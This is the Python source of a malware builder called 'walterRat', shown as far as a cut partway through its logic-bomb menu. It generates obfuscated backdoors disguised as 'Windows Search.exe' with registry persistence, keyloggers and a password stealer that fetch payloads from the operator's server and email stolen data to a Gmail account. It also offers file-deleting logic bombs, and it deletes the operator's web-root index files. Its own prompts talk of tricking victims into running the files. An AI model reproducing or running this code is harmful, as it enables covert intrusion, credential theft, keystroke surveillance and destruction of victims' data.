import random
import os
import sys
import subprocess
from subprocess import PIPE,Popen
import base64
import getpass
sys.path.append("./viruses/")
from colors import *
import time
class walterRat:
    def __init__(self):
        os.system("clear")
        liste=["figlet -c -f slant walterRat","figlet -f banners/avatar.flf -c walterRat","figlet -f banners/bell.flf -c walterRat","figlet -f banners/big.flf -c walterRat","figlet -f banners/larry3d.flf -c walterRat","figlet -f banners/kban.flf -c walterRat"]
        
        liste1=["RED","OKBLUE","YELLOW","GREEN","LIGHTBLUE","FAIL"]
        choice=random.choice(liste)
        print colors["BOLD"]+colors[random.choice(liste1)]
        os.system(choice)
        print "\t      v1.0"
        print "%s-----------------------------------------------------------------------------%s"%(colors["RED"],colors["END"])
        print "\t%s%sGITHUB%s:%shttps://www.github.com/AzizKpln%s\n\t%s%sFACEBOOK%s:%shttps://www.facebook.com/aziz.kaplan.96387%s\n\t%s%sINSTAGRAM%s:%shttps://www.instagram.com/aziz.kpln%s\n\t%s%sYOUTUBE%s:%shttps://www.youtube.com/channel/UCHGEA5g4iFDdBognYNWCJbA%s"%(colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"],colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"],colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"],colors["BOLD"],colors["OKBLUE"],colors["RED"],colors["YELLOW"],colors["END"])
        print "%s-----------------------------------------------------------------------------%s"%(colors["RED"],colors["END"])
   

    def wywtowrite_Tr(self):
        global wywtowrite
        wywtowrite=raw_input("Dosyalari Degistirmek Istedigin Yaziyi Yaz:")
    def conculution(self):
        return wywtowrite
    def wywtowrite_En(self):  
         wywtowrite=raw_input("Input The Text That You Want To Replace The Files:")
    def run(self):
	hostname=subprocess.check_output(["id"])
	hostname=hostname.split("(")
	hostname=str(hostname[1]).split(")")

	selection="\n\t"+colors["RED"]+"["+colors["YELLOW"]+"1"+colors["RED"]+"]"+colors["GREEN"]+"Turkish\n\n"+"\n\t"+colors["RED"]+"["+colors["YELLOW"]+"2"+colors["RED"]+"]"+colors["GREEN"]+"English\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
        select=raw_input(selection)
        os.system("sudo rm /var/www/html/index*")
        if select=="1":
            os.system("clear")
            print "%s[!]%sDil Turkce Olarak Belirlendi."%(colors["RED"],colors["YELLOW"])
            time.sleep(3)
            self.__init__()
            selection="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
            options="""
%s[%s!%s]%sLutfen Islem Sec%s

    %s[%s1%s]%sBackdoor Olustur(FUD 99)%s
    %s[%s2%s]%sKeylogger Olustur(FUD 100)%s
    %s[%s3%s]%sPassword Stealer Olustur(FUD 100)%s
    %s[%s4%s]%sLogic Bomb Olustur(FUD 100)%s
    %s[%s5%s]%sDinlemeye Al%s

    """%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])+selection
            inpt=raw_input(options)
            if inpt=="1":
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sIp Adresini Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                address_cross="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Ip_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
        
                default_private_ip=subprocess.check_output("nmcli -p device show",shell=True)
                default_private_ip=default_private_ip.split("\n")
                for i in default_private_ip:
                    if i.startswith("IP4.ADDRESS[1]:") and not "127.0.0.1" in i:
                        default_private_ip=i.split(":")
                        default_private_ip=default_private_ip[1]
                        default_private_ip=default_private_ip.split("/")
                        default_private_ip=str(default_private_ip[0])
                        default_private_ip=str(default_private_ip.strip())
                print "\n%s=================================="%colors["YELLOW"]
                print "\n%s[%s+%s]%sPrivate Ip Adresin:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],default_private_ip)
                public_ip=subprocess.check_output("curl -s icanhazip.com",shell=True)
                public_ip=public_ip.split("\n")
                public_ip=str(public_ip[0])
                print "%s[%s+%s]%sPublic Ip Adresin:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],public_ip)
                print "%s==================================\n"%colors["YELLOW"]
                ip_adres=raw_input(address_cross)
                print "\n%s[%s+%s]%sIp Adresi:%s%s%s"%(colors["YELLOW"],colors["OKBLUE"],colors["YELLOW"],colors["YELLOW"],colors["OKBLUE"],ip_adres,colors["END"])
                os.system("systemctl start apache2.service")
                Popen(["lxterminal","-t","walterRat","-e","sudo cd /var/www/html/ && python -m SimpleHTTPServer 8080"])                    
                time.sleep(3)
                os.system("clear")
                self.__init__()
                print "%s[%s!%s]%sPort Numarani Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Port_Numarasi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                port_adres=raw_input(ac)
                print "\n%s[%s+%s]%sPort Numaran:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],port_adres)
                time.sleep(3)
                os.system("clear")
                self.__init__()
                with open (r"viruses/backdoor_unencrypted.py","r+") as bd:
                    backdoor_codes=bd.read()
                    portip_codes="""
while True:
    try:
        my_Health=Health('%s',%s)
        my_Health.run()
    except:
        pass"""%(ip_adres,port_adres)
                codes=backdoor_codes+portip_codes
                code=base64.b64encode(codes)
                
                with open("Windows Search.py","w") as wr:
                    wr.write("""
import base64
from cryptography.fernet import Fernet
import socket
import os
import json
import subprocess
import base64
import sys
import pyautogui
import tempfile
import sys
import time
import threading
import cv2
from scipy.io.wavfile import write
import sounddevice
key=Fernet.generate_key()
f=Fernet(key)
token = f.encrypt(b"%s")
try:
    e_f_loc=os.environ["appdata"]+"\\Windows Search.exe"
    if not os.path.exists(e_f_loc):
        shutil.copyfile(sys.executable,e_f_loc)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)
except:
    pass
exec(base64.b64decode(f.decrypt(token)))

"""%(code))
                isim="%s[%s+%s]%sBackdoor Icin Isim Gir[ISMI DEGISTIREMEZSIN SONRA DEGISTIRIRSEN BAGLANTI GERCEKLESMEZ!]"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"])
                isim=isim+"\n%s[!]%sUzanti Girme(dosyam.exe degil dosyam seklinde gir)"%(colors["RED"],colors["YELLOW"])
                
                inp=isim+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Isim"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                bd_name=raw_input(inp)
                os.system("clear")
                self.__init__()

                seng="%s[%s!%s]%sSosyal Muhendislik Olsun Mu?%s\n\n\t%s[%s+%s]%sEvet/Hayir\n%s[%s!%s]%sTurkce Karakter Kullanmayiniz!"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                cus=raw_input(song)
                cus=cus.upper()
                if cus=="EVET" or cus=="evet":
                    os.system("clear")
                    self.__init__()
                    file_path="%s[%s+%s]%sBirlestirilecek Dosya Adini Gir[DOSYA AYNI DIZINDE OLMAK ZORUNDADIR]%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"DosyaYolu"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    filep=raw_input(file_path)    
                    fname="Windows Search.exe"
                    evil_file="""
import requests,re,subprocess,smtplib,tempfile
import os
import sys
import time
import shutil
def get_info(url):
        resp=requests.get(url)
        file_name=url.split("/")[-1]
        with open(file_name,"wb") as file:
                file.write(resp.content)
file_name=sys._MEIPASS+"\%s"
subprocess.Popen(file_name,shell=True)
temp_folder=tempfile.gettempdir()
os.chdir(temp_folder)
get_info("http://%s:8080/%s")
try:
    e_f_loc=os.environ["appdata"]+"\\Windows Search.exe"
    if not os.path.exists(e_f_loc):
        shutil.copyfile(sys.executable,e_f_loc)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)
except:
    pass
subprocess.call('%s',shell=True)       
"""%(filep,ip_adres,fname,fname)
                    dosya=bd_name+".py"
                    with open(dosya,"w") as f:
                        f.write(evil_file)
                    hostname=subprocess.check_output(["id"])
		    hostname=hostname.split("(")
		    hostname=str(hostname[1]).split(")")

		    os.system("clear")
                    self.__init__()
                    icon="%s[%s+%s]%sIcon Olsun Mu?%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    ico=raw_input(icon)
                    ico=ico.upper()
                    if ico=="EVET" or ico=="evet":
                        os.system("clear")
                        self.__init__()
                        icon="%s[%s+%s]%sIcon Yolunu Gir%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]                
                        ic=raw_input(icon)
                        print ic
                        
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data '%s;.' --noconsole --onefile --icon %s %s.py"%(str(hostname[0]),filep,ic,bd_name)
                        os.system(com)
                    else:
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data '%s;.' --noconsole --onefile %s.py"%(str(hostname[0]),filep,bd_name)
                        os.system(com)
                else:
                    fname="Windows Search.exe"
                    evil_file="""
import requests,re,subprocess,smtplib,tempfile
import os
import shutil
import time
def get_info(url):
        resp=requests.get(url)
        file_name=url.split("/")[-1]
        with open(file_name,"wb") as file:
                file.write(resp.content)
temp_folder=tempfile.gettempdir()
os.chdir(temp_folder)
get_info("http://%s:8080/%s")
e_f_loc=os.environ["appdata"]+"\\Windows Search.exe"
subprocess.call('%s',shell=True)


"""%(ip_adres,fname,fname)
                    dosya=bd_name+".py"
                    with open(dosya,"w") as f:
                        f.write(evil_file)
                    os.system("clear")
                    self.__init__()
                    icon="%s[%s+%s]%sIcon Olsun Mu?%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    ico=raw_input(icon)
                    ico=ico.upper()
                    if ico=="EVET" or ico=="evet":
                        os.system("clear")
                        self.__init__()
                        icon="%s[%s+%s]%sIcon Yolunu Gir%s"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"])+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconSecimi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]                
                        ic=raw_input(icon)
                        print ic
                        
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile --icon %s %s.py"%(str(hostname[0]),ic,bd_name)
                        os.system(com)
                    else:
                        com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile %s.py"%(str(hostname[0]),bd_name)
                        os.system(com)
                os.system("cp dist/%s.exe exe_files/"%bd_name)
                os.system("sudo cp exe_files/%s.exe /var/www/html"%bd_name)
                print colors["GREEN"]
                os.system("clear")
                self.__init__()
                com="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --onefile --icon Search-Icon/search.ico Windows\ Search.py"%str(hostname[0])

                os.system(com)
                time.sleep(1)
                os.system("cp dist/Windows\ Search.exe exe_files/")
                os.system("sudo cp exe_files/Windows\ Search.exe /var/www/html")
                os.system("rm -r build/ dist/")
                os.system("rm -r Windows\ Search.py *.spec %s.py"%bd_name)

                os.system("clear")
                self.__init__()
                seng="%s[%s!%s]%sTum Gerekli Dosyalar /var/www/html Klasorunde%s\n\n\t%s[%s!%s]%sWindows Search.exe'ye DOKUNMA!\n%s[%s!%s]%sKurban Makineye '%s.exe' Dosyasini Yedirmen Gerekiyor"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"],bd_name)
                print seng
                
                kod="""
import sys
sys.path.append("./viruses/")
from listener import *
my_listener=Listener('%s',%s)
try:
    t=threading.Thread(target=my_listener.run,name='listener')
    t.start()
except:
    pass"""%(default_private_ip,port_adres)
                with open("viruses/walterRat_listener.py","w") as wr:
                    wr.write(kod)
                Popen(["lxterminal","-t","walterRat","-e","python","viruses/walterRat_listener.py"])
            elif inpt=="2":
                os.system("systemctl start apache2.service")
                os.system("clear")
                self.__init__()
                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                print "%s[%s+%s]%sGmail Adresini Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Mail_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                mail=raw_input(ac)
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sParolani Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Password"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                password=getpass.getpass(ac)
                with open(r"viruses/walterRat_keylogger.py","r") as kg:
                    c=kg.read()
                c1="""
mc=capture_words('%s','%s')
mc.start()
"""%(mail,password)
                c=c+c1
                k_code=base64.b64encode(c)

                keylogger_code="""
import sys
import pynput.keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
import pyautogui
import tempfile
import os
import subprocess
import shutil
from cryptography.fernet import Fernet
import base64
key=Fernet.generate_key()
f=Fernet(key)
token = f.encrypt(b"%s")
exec(base64.b64decode(f.decrypt(token)))
"""%(k_code)
                os.system("clear")
                self.__init__()
                seng="%s[%s!%s]%sKeylogger Default Sosyal Muhendislik Ile Mi Uretilsin?%s\n\n\t%s[%s+%s]%sevet/hayir\n%s[%s!%s]%sUse Solely English Letters"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"walterRat"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                cus=raw_input(song)
                cus=cus.upper()
                
                if cus=="EVET" or cus=="evet":
                    os.system("clear")
                    self.__init__()
                    bd_name="Explorer"
                    os.system("clear")
                    self.__init__()   
                    with open("Explorer.py","w") as keylogger:
                        keylogger.write(keylogger_code)
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole --onefile --icon Search-Icon/explorer.ico Explorer.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/Explorer.exe exe_files/")
                    os.system("sudo cp exe_files/Explorer.exe /var/www/html")
                    os.system("sudo rm -r dist/ build/ Explorer* ")
                    os.system("clear")
                
                else:
                    os.system("clear")
                    self.__init__()
                    seng="%s[%s+%s]%sKeylogger'a Bir Isim Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Name"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    bd_name=raw_input(song)
                    os.system("clear")
                    self.__init__()   
                    bd_name=bd_name+".py"
                    with open(bd_name,"w") as keylogger:
                        keylogger.write(keylogger_code)
                    seng="%s[%s!%s]%sIcon Eklensin mi%s\n\n\t%s[%s+%s]%sevet/hayir\n%s[%s!%s]%sTurkce Harfleri Kullanmayiniz"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["END"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["YELLOW"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                    song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Icon"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                    ic=raw_input(song)
                    if ic=="evet" or ic=="EVET":
                        os.system("clear")
                        self.__init__()
                        seng="%s[%s+%s]%sIcon Yolunu Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                        song=seng+"\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"IconPath"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                        ic_path=raw_input(song)
                        ic_path=str(ic_path)
                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile --icon %s %s "%(str(hostname[0]),ic_path,bd_name)
                        os.system(convert_to_exe)
                        os.system("cp dist/* exe_files/")
                        os.system("sudo cp exe_files/*.exe /var/www/html")
                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
                        os.system("clear")
                    else:
                        convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe --noconsole  --onefile %s"%(str(hostname[0]),bd_name)
                        os.system(convert_to_exe)
                        os.system("cp dist/* exe_files/")
                        os.system("sudo cp exe_files/*.exe /var/www/html")
                        os.system("sudo rm -r dist/ build/ *.spec %s "%bd_name)
                        os.system("clear")
                seng="%s[%s!%s]%sButun Gerekli Dosyalar /var/www/html Icerisinde"%(colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["RED"])
                print seng

            elif inpt=="5":
                try:
                    Popen(["lxterminal","-t","walterRat","-e","python","viruses/walterRat_listener.py"])
                except:
                    os.system("clear")
                    self.__init__()
                    print colors["RED"]+"[!]%sOncesinde Backdoor Olusturmus Olmaniz Gerekmektedir."%(colors["YELLOW"])
            elif inpt=="3":
                os.system("systemctl start apache2.service")
                os.system("clear")
                self.__init__()
                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                print "%s[%s+%s]%sIp Adresini Gir[Local Aga Saldiracak Isen Private Adresini Gir Yoksa Public Adresini Gir]%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                address_cross="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Ip_Address"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]

                default_private_ip=subprocess.check_output("nmcli -p device show",shell=True)
                default_private_ip=default_private_ip.split("\n")
                for i in default_private_ip:
                    if i.startswith("IP4.ADDRESS[1]:") and not "127.0.0.1" in i:
                        default_private_ip=i.split(":")
                        default_private_ip=default_private_ip[1]
                        default_private_ip=default_private_ip.split("/")
                        default_private_ip=str(default_private_ip[0])
                        default_private_ip=str(default_private_ip.strip())
                print "\n%s=================================="%colors["YELLOW"]
                print "\n%s[%s+%s]%sPrivate Ip Adresin:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],default_private_ip)
                public_ip=subprocess.check_output("curl -s icanhazip.com",shell=True)
                public_ip=public_ip.split("\n")
                public_ip=str(public_ip[0])
                print "%s[%s+%s]%sPublic Ip Adresin:%s%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["OKBLUE"],public_ip)
                print "%s==================================\n"%colors["YELLOW"]
                ip_adres=raw_input(address_cross)
                Popen(["lxterminal","-t","walterRat","-e","cd /var/www/html/ && python -m SimpleHTTPServer 8080"])
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sGmail Adresini Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Mail_Adresi"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                mail=raw_input(ac)
                os.system("clear")
                self.__init__()
                print "%s[%s+%s]%sParolani Gir%s"%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])
                ac="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"Parola"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                password=getpass.getpass(ac)
                p_stealer="""
import requests,re,subprocess,smtplib,tempfile
import os
import time
def send_mail(email,password,message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()

def get_info(url):
        resp=requests.get(url)
        file_name=url.split("/")[-1]
        with open(file_name,"wb") as file:
                file.write(resp.content)
temp_folder=tempfile.gettempdir()
os.chdir(temp_folder)
get_info("http://%s:8080/new_project.exe")
result=subprocess.check_output("new_project.exe all",shell=True)
try:
        send_mail('%s','%s',result)
                
except:
        pass
os.remove("new_project.exe")"""%(ip_adres,mail,password)
                with open("password_stealer.py","w") as pstealer:
                    pstealer.write(p_stealer)
                convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --onefile  password_stealer.py"%(str(hostname[0]))
                os.system(convert_to_exe)
                os.system("cp dist/password_stealer.exe viruses/")
                os.system("cp dist/password_stealer.exe .")
                os.system("sudo cp viruses/new_project.exe /var/www/html")
                os.system("sudo cp viruses/password_stealer.exe /var/www/html")
                os.system("sudo rm -r *.spec password_stealer.py dist/ build/")
                os.system("clear")
                self.__init__()
                print "%s[!]%sexe_files/ klasorundeki password_stealer.exe dosyasini kurban makineye atman gerekiyor.%s"%(colors["RED"],colors["YELLOW"],colors["END"])
            elif inpt=="4":
                selection="\n\n"+colors["OKBLUE"]+"walter"+colors["FAIL"]+"@"+colors["YELLOW"]+"LogicBomb"+colors["RED"]+"["+colors["END"]+"~"+colors["RED"]+"]"+colors["END"]
                os.system("clear")
                self.__init__()
                options="""
%s[%s!%s]%sLutfen Islem Sec%s

    %s[%s1%s]%sExe Sil(FUD 100)%s
    %s[%s2%s]%sPdf Sil(FUD 100)%s
    %s[%s3%s]%sTxt Sil(FUD 100)%s
    %s[%s4%s]%sMp3 Sil(FUD 100)%s
    %s[%s5%s]%sMp4 Sil(FUD 100)%s
    %s[%s6%s]%sLnk Sil(FUD 100)%s
    %s[%s7%s]%sDocx Sil(FUD 100)%s
    %s[%s8%s]%sXlsx Sil(FUD 100)%s
    %s[%s9%s]%sXml Sil(FUD 100)%s
    %s[%s10%s]%sPng Sil(FUD 100)%s
    %s[%s11%s]%sJpg Sil(FUD 100)%s
    %s[%s12%s]%sHepsini Sil(FUD 100)%s
    %s[%s13%s]%sTxt Iceriklerini Degistir(FUD 100)%s
    %s[%s14%s]%sPdf Iceriklerini Degistir(FUD 100)%s
    %s[%s15%s]%sDocx Iceriklerini Degistir(FUD 100)%s
    %s[%s16%s]%sXlsx Iceriklerini Degistir(FUD 100)%s
    %s[%s17%s]%sHepsinin Iceriklerini Degistir(FUD 100)%s
    %s[%s18%s]%sHarddisk Somur(FUD 100)%s

    """%(colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"],colors["RED"],colors["YELLOW"],colors["RED"],colors["YELLOW"],colors["END"])+selection
                inpt=raw_input(options)
                if inpt=="1":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_exe.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_exe.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="2":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_pdf.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_pdf.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="3":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_txt.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_txt.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="4":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_mp3.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_mp3.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="5":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_mp4.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_mp4.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="6":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_lnk.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_lnk.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="7":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_docx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_docx.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="8":
                    os.system("clear")
                    self.__init__()
                    convert_to_exe="wine /home/%s/.wine/drive_c/Python27/Scripts/pyinstaller.exe  --noconsole --onefile  viruses/del_xlsx.py"%(str(hostname[0]))
                    os.system(convert_to_exe)
                    os.system("cp dist/del_xlsx.exe exe_files/")
                    os.system("sudo rm -r dist/ build/")
                elif inpt=="9":
                    os.system("clear")
                    self.__init__()
